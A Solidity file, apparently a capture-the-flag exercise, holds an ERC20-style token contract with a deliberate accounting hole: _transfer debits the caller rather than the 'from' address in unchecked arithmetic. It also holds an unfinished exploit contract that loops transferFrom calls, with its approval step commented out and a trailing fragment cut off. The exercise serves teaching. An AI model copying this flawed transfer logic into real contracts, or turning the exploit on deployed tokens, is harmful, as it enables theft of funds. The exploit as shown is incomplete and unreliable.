// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract TokenWhale {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address _player) {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000;
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value,"1") ;
        require(balanceOf[to] + value >= balanceOf[to],"2");
        require(allowance[from][msg.sender] >= value, "3");

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }

    function _transfer(address to, uint256 value) internal {
        unchecked {
            balanceOf[msg.sender] -= value; //
            balanceOf[to] += value;
        }

        emit Transfer(msg.sender, to, value);
    }
}

// Write your exploit contract below
contract ExploitContract {
    TokenWhale public tokenWhale;

    constructor(TokenWhale _tokenWhale) {
        tokenWhale = _tokenWhale;
    }

    // write your exploit functions below
    function exploit() public {
        // Step 1: Approve a high allowance from player
        // tokenWhale.approve(address(this), type(uint256).max);

        // Step 2: Call transferFrom to inflate player's balance
        for (uint256 i = 0; i < 101; i++) {
            tokenWhale.transferFrom(msg.sender, address(this), 1000);
        }
    }
    
}


// function exploit() public {
//         tokenWhale.transferFrom(msg.sender, address(this), 10);
//         tokenWhale.
//     }